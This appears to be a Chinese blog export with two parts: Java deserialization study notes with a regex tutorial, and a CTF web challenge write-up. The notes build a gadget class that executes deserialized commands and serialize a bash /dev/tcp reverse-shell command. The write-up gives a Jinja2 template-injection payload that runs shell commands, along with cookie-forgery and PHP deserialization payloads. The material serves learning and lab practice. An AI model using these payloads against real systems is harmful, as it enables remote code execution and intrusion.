<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;<span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String[] testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTestCall</span><span class="params">(String[] str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.testCall = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ToolsTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToolsTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Tools tools = <span class="keyword">new</span> Tools();</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/ip/6868 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">        tools.setTestCall(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Tools.create(tools);</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>URL DNS链</strong></p>
<p>首先可利用的类为<code>HashMap</code>，因为这个类里面重写了<code>readObject</code>等，然后我们的目标是调用<code>HashMap</code>里面的<code>hashCode</code>方法从而产生DNS请求。</p>
<p>而在put的时候就会在hash函数里面调用<code>key.hashCode()</code>方法，但是在测试的时候会发现，就算没有反序列化也会发起请求，这会对我们是否成功而产生迷惑性，所有我们要使得序列化的时候不能发起请求，所有要在一开始hashCode的值不能为-1，但是又要在反序列化之前把hashCode的值改为-1</p>
<p><code>SerializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不要发起请求</span></span><br><span class="line">        <span class="comment">// 通过java反射</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        <span class="comment">// hashcode改成-1</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UnserializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（个人还不是特别懂 </p>
<h4 id="三、java正则匹配"><a href="#三、java正则匹配" class="headerlink" title="三、java正则匹配"></a>三、java正则匹配</h4><p><a href="https://www.runoob.com/java/java-regular-expressions.html">菜鸟教程</a></p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\</td>
<td align="left">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\n</strong> 匹配换行符。序列 <strong>\\** 匹配 *<em>\*</em> ，</strong>\(** 匹配 **(**。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\n”或”\r”之后的位置匹配。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\n”或”\r”之前的位置匹配。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td>
</tr>
<tr>
<td align="left">{<em>n</em>}</td>
<td align="left"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,}</td>
<td align="left"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,<em>m</em>}</td>
<td align="left"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除”\r\n”之外的任何单个字符。若要匹配包括”\r\n”在内的任意字符，请使用诸如”[\s\S]”之类的模式。</td>
</tr>
<tr>
<td align="left">(<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td>
</tr>
<tr>
<td align="left">(?:<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td>
</tr>
<tr>
<td align="left">(?=<em>pattern</em>)</td>
<td align="left">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left">(?!<em>pattern</em>)</td>
<td align="left">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left"><em>x</em>|<em>y</em></td>
<td align="left">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td>
</tr>
<tr>
<td align="left">[<em>xyz</em>]</td>
<td align="left">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td>
</tr>
<tr>
<td align="left">[^<em>xyz</em>]</td>
<td align="left">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td>
</tr>
<tr>
<td align="left">[<em>a-z</em>]</td>
<td align="left">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td>
</tr>
<tr>
<td align="left">[^<em>a-z</em>]</td>
<td align="left">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个字边界，即字与空格间的位置。例如，”er\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非字边界匹配。”er\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td>
</tr>
<tr>
<td align="left">\c<em>x</em></td>
<td align="left">匹配 <em>x</em> 指示的控制字符。例如，\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">数字字符匹配。等效于 [0-9]。</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">非数字字符匹配。等效于 [^0-9]。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页符匹配。等效于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行符匹配。等效于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">匹配一个回车符。等效于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。与 [^ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">制表符匹配。与 \x09 和 \cI 等效。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">垂直制表符匹配。与 \x0b 和 \cK 等效。</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\x<em>n</em></td>
<td align="left">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\x41”匹配”A”。”\x041”与”\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td>
</tr>
<tr>
<td align="left">*num*</td>
<td align="left">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\1”匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="left">*n*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td>
</tr>
<tr>
<td align="left">*nm*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td>
</tr>
<tr>
<td align="left">\nml</td>
<td align="left">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td>
</tr>
<tr>
<td align="left">\u<em>n</em></td>
<td align="left">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\u00A9 匹配版权符号 (©)。</td>
</tr>
</tbody></table>
<h5 id="Pattern-Matcher"><a href="#Pattern-Matcher" class="headerlink" title="Pattern Matcher"></a>Pattern Matcher</h5><blockquote>
<p>Pattern.matches()</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.matches</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">boolean</span> res = Pattern.matches(<span class="string">&quot;a|m|e|u|u&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pattern + Matcher</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.compile (matcher) + Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String data[] = &#123;<span class="string">&quot;[0-9]&#123;11&#125;&quot;</span>,<span class="string">&quot;[0-9]&#123;4&#125;\\.[0-9]&#123;1,2&#125;\\.[0-9]&#123;1,2&#125;&quot;</span>&#125;;</span><br><span class="line">       </span><br><span class="line">        Pattern r = Pattern.compile(data[<span class="number">1</span>]);</span><br><span class="line">        Matcher ans = r.matcher(<span class="string">&quot;2001.1.2&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(ans.find())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;group:&quot;</span>+ans.group()); <span class="comment">// 2001.1.2</span></span><br><span class="line">            System.out.println(<span class="string">&quot;start:&quot;</span>+ans.start()); <span class="comment">// 0</span></span><br><span class="line">            System.out.println(<span class="string">&quot;end:&quot;</span>+ans.end()); <span class="comment">// 8</span></span><br><span class="line">            System.out.println(<span class="string">&quot;matches:&quot;</span>+ans.matches()); <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;lookingAt:&quot;</span>+ans.lookingAt()); <span class="comment">// true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String input = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">        Pattern p = Pattern.compile(input);</span><br><span class="line">        Matcher m = p.matcher(<span class="string">&quot;catcatcatcatcatcatcatdogcatcatcatdog&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(m.find())&#123;</span><br><span class="line">            input = m.replaceAll(<span class="string">&quot;fish&quot;</span>);</span><br><span class="line">            System.out.println(input); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatfish</span></span><br><span class="line">            input = m.replaceFirst(<span class="string">&quot;fish&quot;</span>); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatdog</span></span><br><span class="line">            System.out.println(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>java反射</tag>
      </tags>
  </entry>
  <entry>
    <title>n3ctf_web_wp</title>
    <url>/2022/01/21/n3ctf-wp/</url>
    <content><![CDATA[<h5 id="00-F12"><a href="#00-F12" class="headerlink" title="00-F12"></a>00-F12</h5><p>签到，F12看js源码，查找flag就可以找到了</p>
<h5 id="01-headers"><a href="#01-headers" class="headerlink" title="01-headers"></a>01-headers</h5><p>（赛后复现的 打出来之后真的觉得自己还是太菜了</p>
<p>这道题存在信息泄露，简单的<code>robots.txt</code>（哎</p>
<p>然后进入<code>ydswantmanygfs.php</code>，直接说<code>You are not from yoshino-s.online</code>，那么直接抓包吧</p>
<p>可以在头信息中发现一个hint：<code> How to get remote ip</code></p>
<p>先试着用XFF传<code>yoshino-s.online</code>，但是页面没有改变，那么说明现在就要利用hint，remote ip也就是发出请求的主机ip，那么ping一下吧</p>
<p><img src="https://img-blog.csdnimg.cn/809c88f292764c74b9f624287d05aa16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>XFF换成<code>47.116.142.11</code>就可以得到flag了</p>
<span id="more"></span>

<h5 id="02-cookies"><a href="#02-cookies" class="headerlink" title="02-cookies"></a>02-cookies</h5><p>玩了一会之后可以发现cookie里面有score的值</p>
<p>可以直接拿去解码，这里的<code>%3d</code>是<code>=</code>，所以可以先猜测是base64</p>
<p><img src="https://img-blog.csdnimg.cn/62729a4795ec45c488e111424bc6158d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>Gunzip解密之后就是我们原本的成绩了</p>
<p>直接百度，可以知道加密方式是<code>Gzip</code></p>
<p>那么就直接用301一步一步加密回去，在score.php界面抓包，修改一下session就好了</p>
<p>payloao:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H4sIAGWo6WEA/wXAAQkAAADCsEoe+3cbXwAStPRXAwAAAA==</span><br></pre></td></tr></table></figure>



<h5 id="04-template"><a href="#04-template" class="headerlink" title="04-template"></a>04-template</h5><p>没有任何过滤的模板注入</p>
<p>jinjia</p>
<p>直接打payload就好了，这里选择<code>catch_warnings</code>，直接写个脚本找吧，实在不行一个一个数</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="05-php"><a href="#05-php" class="headerlink" title="05-php"></a>05-php</h5><p>陇原战役的题目，但是被改过了，直接看hint的phpinfo就可以找到flag</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezhttpd"><a href="#Ezhttpd" class="headerlink" title="Ezhttpd"></a>Ezhttpd</h5><p>简单的代码审计</p>
<p>就以刚看到这道题的时候的顺序，我们一个一个文件审计：</p>
<p><strong>0x01:index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;evil.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>包含 <code>evil.php</code>，实例化<code>Temp</code>类，post传值，get传filename到display函数中</p>
<p><strong>0x02:evil.php</strong></p>
<p>// 重点！！  看完还是对方法有困惑的可以百度  “php魔术方法”  甚至可以去自学面向对象</p>
<p>1.这里主要就是<code>Temp</code>类，查看逐个方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__construct</code> 构造方法，在实例化类的时候自动调用，也就是我们在index.php利用post传的值就是这里$data的值；</p>
<p><code>array_merge</code>合并两个数组；</p>
<p>2.<code>getTempName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入相应参数，要求<code>$dir===&#39;admin&#39;</code>并修改<code>$this-&gt;template</code>的值；</p>
<p><code>str_replace</code>字符串替换函数；</p>
<p>3.<code>display</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>extract</code>对<code>$this-&gt;data</code>的值进行变量覆盖：</p>
<p>之后调用<code>getTempName</code>方法，这里我们会把display默认的参数<code>$space</code>再次传入<code>getTemlName</code>，别忘了我们之前审计的代码中要求传入的第二个参数要为<code>admin</code>，所以我们这里也要实现对space的修改，而由于有变量覆盖，所以我们可以利用post传sapce为admin，从而使得space进入<code>$this-&gt;date</code>，实现在变量覆盖的时候而方法中对<code>$this-&gt;template</code>进行了修改，并在最后包含<code>$this-&gt;template</code>表示的文件</p>
<p>4.<code>listdata</code></p>
